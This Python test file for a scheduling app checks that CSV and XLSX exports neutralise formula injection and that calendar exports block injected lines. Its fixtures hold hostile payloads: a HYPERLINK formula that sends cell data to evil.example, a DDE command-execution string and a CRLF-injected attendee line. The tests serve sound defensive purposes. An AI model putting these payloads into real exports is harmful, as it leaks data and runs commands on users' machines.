"""Review M8: formula injection in CSV / XLSX exports and line injection in ICS, on a real Bahar run."""

from __future__ import annotations

import csv
import io

import openpyxl
from app.core.db import get_session_factory
from app.core.export_safety import ics_text, neutralize_workbook, safe_cell
from app.models import Assignment, Room
from app.workers.queue import get_queue
from sqlalchemy import select

from tests import studio_support
from tests.api_fixtures import login

bahar = studio_support.bahar
EVIL = '=HYPERLINK("http://evil.example/?"&A1,"Click")'


async def test_m8_exports_neutralise_formulas_and_ics_lines(bahar, stub_solver):
    c, h = bahar.client, bahar.planner
    body = {"term_id": bahar.term_id, "kind": "COURSE", "horizon": "WEEK", "horizon_params": {"weeks": [3]}}
    r = await c.post("/api/v1/runs", json={**body, "params": {"solver": "cpsat", "time_limit_s": 5}}, headers=h)
    run_id = r.json()["run_id"]
    await get_queue().wait_idle(timeout=300)
    async with get_session_factory()() as s:
        a = (
            (await s.execute(select(Assignment).where(Assignment.run_id == run_id).order_by(Assignment.id)))
            .scalars()
            .first()
        )
        assert a is not None and a.room_ids
        a.notes = "@SUM(1+1)*cmd|' /C calc'!A0\r\nATTENDEE:mailto:x@evil.example"
        room = await s.get(Room, int(a.room_ids[0]))
        room.display_name = EVIL
        await s.commit()
    # CSV: every text cell that starts with = + - @ is quoted
    text = (await c.get(f"/api/v1/runs/{run_id}/export", params={"format": "csv"}, headers=h)).text
    cells = [v for row in csv.reader(io.StringIO(text)) for v in row]
    assert any(v.startswith("'@SUM") for v in cells)
    assert not [v for v in cells if v[:1] in ("=", "+", "@")]
    # XLSX: the room header is a text cell (never a formula)
    data = (await c.get(f"/api/v1/runs/{run_id}/export", params={"format": "xlsx", "weeks": "3"}, headers=h)).content
    wb = openpyxl.load_workbook(io.BytesIO(data))
    evil = [
        cell for ws in wb.worksheets for row in ws.iter_rows() for cell in row if str(cell.value or "").startswith("=")
    ]
    assert evil and all(cell.data_type == "s" and cell.quotePrefix for cell in evil)
    # ICS: no injected property line (CAL-04: the board notes are not exported any more, so the injected text cannot
    # appear at all)
    ics = (await c.get(f"/api/v1/runs/{run_id}/export", params={"format": "ics"}, headers=h)).text
    assert "\nATTENDEE" not in ics and "\rATTENDEE" not in ics and "ATTENDEE:mailto" not in ics


def test_m8_helpers():
    assert (
        safe_cell("=1+1") == "'=1+1"
        and safe_cell("-") == "'-"
        and safe_cell(-5) == -5
        and safe_cell("A 101") == "A 101"
    )
    assert safe_cell("\tx") == "'\tx" and safe_cell("İstanbul") == "İstanbul"
    assert ics_text("a;b,c\r\nBEGIN:VEVENT\x00") == "a\\;b\\,c\\nBEGIN:VEVENT"
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.append(["=1+1", "+cmd", "MAT 112", 3])
    assert neutralize_workbook(wb) == 2 and ws["C1"].data_type == "s" and ws["A1"].data_type == "s"


async def test_export_weeks_parameter_is_validated(client):
    """Security fix follow-up: ``weeks`` used a bare ``int()`` (``weeks=4-6`` or text gave a 500). It takes a comma
    list with ranges ("4,6-8"); anything else, or weeks outside the term, is a 422 with a Turkish and an English
    message. Only the xlsx board honours it (csv / ics / crbs export the whole run)."""
    from app.core.db import get_session_factory
    from app.models import ScheduleRun, Term

    h = await login(client)
    async with get_session_factory()() as s:
        term = Term(code="2026-BAHAR", name="2026 Bahar", week_count=14)
        s.add(term)
        await s.flush()
        run = ScheduleRun(term_id=term.id, kind="COURSE", horizon="TERM", status="FEASIBLE", hard_score=100)
        s.add(run)
        await s.commit()
        rid = run.id
    url = f"/api/v1/runs/{rid}/export"
    for ok in ("4-6", "4,6-8", " 3 , 5 ", "14"):
        r = await client.get(url, params={"format": "xlsx", "weeks": ok}, headers=h)
        assert r.status_code == 200, (ok, r.text)
    for bad in ("abc", "4-", "6-4", "0", "15", "1;2", "3-99"):
        r = await client.get(url, params={"format": "xlsx", "weeks": bad}, headers=h)
        assert r.status_code == 422, (bad, r.text)
        d = r.json()["detail"]
        assert d["code"] == "weeks" and d["message_tr"] and d["message_en"], d
    r = await client.get(url, params={"format": "csv", "weeks": "4-6"}, headers=h)
    assert r.status_code == 200  # accepted, the whole run is exported
